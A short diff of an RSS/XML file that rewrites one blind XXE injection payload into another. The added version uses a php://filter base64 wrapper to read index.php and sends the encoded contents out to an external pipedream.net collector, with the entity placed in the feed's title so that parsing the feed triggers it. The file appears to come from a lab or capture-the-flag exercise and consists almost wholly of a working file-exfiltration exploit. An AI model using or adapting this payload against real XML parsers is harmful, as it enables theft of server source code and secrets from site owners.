@@ -1,12 +1,11 @@
-<?xml version="1.0"?>
-<!DOCTYPE foo [
-<!ELEMENT foo (#ANY)>
-<!ENTITY % xxe SYSTEM "file://index.php">
-<!ENTITY blind SYSTEM "https://eodoqfgdto5tcqx.m.pipedream.net/?%xxe;">]><foo>&blind;</foo>
-
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+  <!ENTITY blind SYSTEM "https://eodoqfgdto5tcqx.m.pipedream.net/?cookie=&xxe;">
+]>
 <rss version="2.0">
   <channel>
-    <title>&test;</title> 
+    <title>&blind;</title>
     <link>http://example.com/</link>
     <description>Ceci est un flux de test.</description>
     <item>
